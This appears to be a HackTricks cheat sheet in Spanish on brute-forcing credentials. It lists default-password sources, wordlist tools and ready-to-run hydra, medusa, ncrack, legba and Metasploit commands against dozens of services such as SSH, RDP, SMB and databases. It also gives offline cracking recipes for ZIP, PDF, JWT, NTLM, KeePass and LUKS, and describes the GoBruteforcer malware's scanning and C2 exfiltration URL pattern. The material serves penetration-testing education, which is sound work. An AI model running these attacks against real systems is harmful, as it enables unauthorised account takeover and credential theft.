# Brute Force - Hoja de referencia

{{#include ../banners/hacktricks-training.md}}

## Credenciales predeterminadas

**Busca en Google** las credenciales predeterminadas de la tecnología que se está usando, o **prueba estos enlaces**:

- [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
- [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
- [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
- [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
- [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
- [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
- [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
- [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
- [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
- [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
- [**https://many-passwords.github.io/**](https://many-passwords.github.io)
- [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **Crea tus propios diccionarios**

Busca toda la información posible sobre el objetivo y genera un diccionario personalizado. Estas herramientas pueden ser útiles:

### Crunch

```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```

### Listas de palabras basadas en sitios web

```bash
# Cewl gets words from the victims page
cewl example.com -m 5 -w words.txt

# Tok (https://github.com/tomnomnom/hacks/tree/master/tok) gets words from a list of URLs
cat /path/to/urls.txt | tok

# https://github.com/m4ll0k/BBTz/blob/master/getjswords.py gets words from a list of JS URLs
cat /path/to/js-urls.txt | python3 getjswords.py
```

### [CUPP](https://github.com/Mebus/cupp)

Genera contraseñas basadas en lo que sabes de la víctima (nombres, fechas...)

```
python3 cupp.py -h
```

### [Wister](https://github.com/cycurity/wister)

Una herramienta para generar wordlists que permite proporcionar un conjunto de palabras y crear múltiples variaciones a partir de ellas, generando una wordlist única e ideal para usar con un objetivo específico.

```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

 __          _______  _____ _______ ______ _____
 \ \        / /_   _|/ ____|__   __|  ____|  __ \
  \ \  /\  / /  | | | (___    | |  | |__  | |__) |
   \ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
    \  /\  /   _| |_ ____) |  | |  | |____| | \ \
     \/  \/   |_____|_____/   |_|  |______|_|  \_\

      Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```

### [pydictor](https://github.com/LandGrey/pydictor)

### Listas de palabras

- [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
- [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
- [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
- [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
- [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
- [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
- [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
- [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
- [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
- [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

## Flujo de trabajo de fuerza bruta a escala de Internet (lecciones de escáneres basados en Go)

Se observaron los siguientes comportamientos en el flujo de escaneo del malware GoBruteforcer; los valores exactos dependen de cada muestra.<sup>[[1]](#references)</sup>

- Mantener **grupos de workers ajustados a la arquitectura** (por ejemplo, 95 workers concurrentes en `x86_64/arm64`, 85 en `i686`, 35 en `armv5tel` y 50 de forma predeterminada en otras arquitecturas), comprobar cada segundo los workers activos y crear reemplazos cuando haya menos del objetivo; cada worker gestiona como máximo una IP de destino antes de salir.
- Generar **direcciones IPv4 públicas aleatorias**, pero descartar rangos obviamente no enrutables y algunos rangos que los operadores optan por evitar: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, rangos `/8` con alta presencia de servicios cloud (`3/15/16/56`) y rangos `/8` asociados al DoD (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
- **Sondear el puerto del servicio** con un tiempo de espera breve (~2s) antes de intentar **inicios de sesión en texto claro** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin mediante HTTP/80), y recurrir a una **pequeña lista de credenciales integrada** si falla la obtención de credenciales desde el C2.
- **Exfiltrar los resultados** mediante pequeñas solicitudes HTTP GET de señalización como `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (códigos de servicio como `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`), reutilizando un User-Agent común de navegador para pasar desapercibido.
- El **spray de phpMyAdmin** puede probar por fuerza bruta unas 80 rutas probables con `GET /index.php?lang=en`, detectar indicadores de PMA (tema `pmahomme`/`phpmyadmin.css`/`navigation.php`) y analizar `codemirror.css?v=X.Y.Z` para elegir el método de autenticación: las versiones `<4.9` aceptan parámetros GET `pma_username`/`pma_password`; las versiones `>=4.9` usan POST con `server=1`, el CSRF `token` y las mismas credenciales.

## Servicios

Ordenados alfabéticamente por nombre del servicio.

### AFP

```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```

### AJP

```bash
nmap --script ajp-brute -p 8009 <IP>
```

### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM y Solace)

```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```

### Cassandra

```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```

### ClickHouse

[bruter](https://github.com/vflame6/bruter)

```bash
bruter clickhouse -u default -p passwords.txt localhost:9000
```

### CouchDB

```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```

### Registro de Docker

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```

### Elasticsearch

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```

### FTP

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```

### Brute force genérico HTTP

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP Basic Auth

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```

### HTTP - NTLM

```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```

### HTTP - Post Form

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```

Para http**s** tienes que cambiar de "http-post-form" a "**https-post-form"

### **HTTP - CMS --** (W)ordpress, (J)oomla o (D)rupal o (M)oodle

```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```

### IMAP

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```

### IRC

```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```

### ISCSI

```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```

### JWT

```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```

### LDAP

```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```

### MQTT

```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```

### Mongo

```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```

### MSSQL

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
```

```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```

### MySQL

```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```

### OracleSQL

```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```

Para usar **oracle_login** con **patator**, necesitas **instalar**:

```bash
pip3 install cx_Oracle --upgrade
```

[Bruteforce offline de hashes de OracleSQL](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versiones 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2** y **11.2.0.3**):

```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```

### POP

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```

### PostgreSQL

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```

### PPTP

Puedes descargar el paquete `.deb` para instalarlo desde [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)

```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```

### RDP

```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```

### Redis

```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```

### Rexec

Para conocer el comportamiento del servicio Rexec autenticado con contraseña, consulta [Pentesting Rexec (512/TCP)](../network-services-pentesting/512-pentesting-rexec.md).

```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```

### Rlogin

Para la autenticación de hosts de confianza y el acceso al terminal, consulta [Pentesting Rlogin (513/TCP)](../network-services-pentesting/pentesting-rlogin.md#rlogin-513tcp).

```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```

### Rsh

Para la autenticación de hosts de confianza y los comandos remotos, consulta [Pentesting Rsh (514/TCP)](../network-services-pentesting/pentesting-rlogin.md#rsh-514tcp).

```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```

[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```

### RTSP

```bash
hydra -l root -P passwords.txt <IP> rtsp
```

### SFTP

```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

### SNMP

```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```

### SMB

```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```

### SMPP

```bash
bruter smpp -u smppclient1 -p passwords.txt localhost:2775
```

### SMTP

```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```

### SOCKS

```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```

### SQL Server

```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```

### SSH

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

#### Claves SSH débiles / PRNG predecible de Debian

Algunos sistemas tienen fallos conocidos en la semilla aleatoria que se usa para generar material criptográfico. Esto puede reducir drásticamente el espacio de claves, lo que permite aplicar fuerza bruta con herramientas como [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). También hay conjuntos de claves débiles pregeneradas, como [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### STOMP (ActiveMQ, RabbitMQ, HornetQ y OpenMQ)

El protocolo de texto STOMP es un protocolo de mensajería muy utilizado que **permite una comunicación e interacción fluidas con servicios populares de colas de mensajes** como RabbitMQ, ActiveMQ, HornetQ y OpenMQ. Proporciona un enfoque estandarizado y eficiente para intercambiar mensajes y realizar diversas operaciones de mensajería.

```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```

### Telnet

```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
    --username admin \
    --password wordlists/passwords.txt \
    --target localhost:23 \
    --telnet-user-prompt "login: " \
    --telnet-pass-prompt "Password: " \
    --telnet-prompt ":~$ " \
    --single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```

### VNC

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -p 5900,5901 --script vnc-brute --script-args brute.credfile=wordlist.txt <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```

### Winrm

```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```


## Local

### Bases de datos online de cracking

- [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 y SHA1)
- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 con/sin ESS/SSP y con cualquier valor de challenge)
- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, capturas WPA2 y archivos comprimidos MSOffice, ZIP, PDF...)
- [https://crackstation.net/](https://crackstation.net) (Hashes)
- [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
- [https://gpuhash.me/](https://gpuhash.me) (Hashes y hashes de archivos)
- [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
- [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
- [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
- [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
- [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Consulta esto antes de intentar hacer brute force de un hash.

### ZIP

```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```

#### Known plaintext zip attack

Necesitas conocer el **plaintext** (o parte del plaintext) **de un archivo incluido dentro** del zip cifrado. Puedes comprobar los **nombres y el tamaño de los archivos incluidos** en un zip cifrado ejecutando: **`7z l encrypted.zip`**\
Descarga [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) desde la página de releases.

```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```

### 7z

```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```

### PDF

```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```

### Contraseña de propietario de PDF

Para crackear la contraseña de propietario de un PDF, consulta esto: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT

```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```

### NTLM cracking

```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```

### Keepass

```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

### Keberoasting

```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### Imagen de Lucks

#### Método 1

Instalar: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)

```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

#### Método 2

```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

Otro tutorial de fuerza bruta de LUKS: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql

```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```

### Clave privada PGP/GPG

```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```

### Cisco

<figure><img src="../images/image (663).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

Usa [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) y luego john

### Columna protegida con contraseña de Open Office

Si tienes un archivo xlsx con una columna protegida por contraseña, puedes desprotegerla:

- **Súbelo a Google Drive** y la contraseña se eliminará automáticamente
- Para **eliminarla** **manualmente**:

```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```

### Certificados PFX

```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```

## Herramientas

**Ejemplos de hashes:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-identifier

```bash
hash-identifier
> <HASH>
```

### Listas de palabras

- **Rockyou**
- [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
- [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
- [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Herramientas para generar listas de palabras**

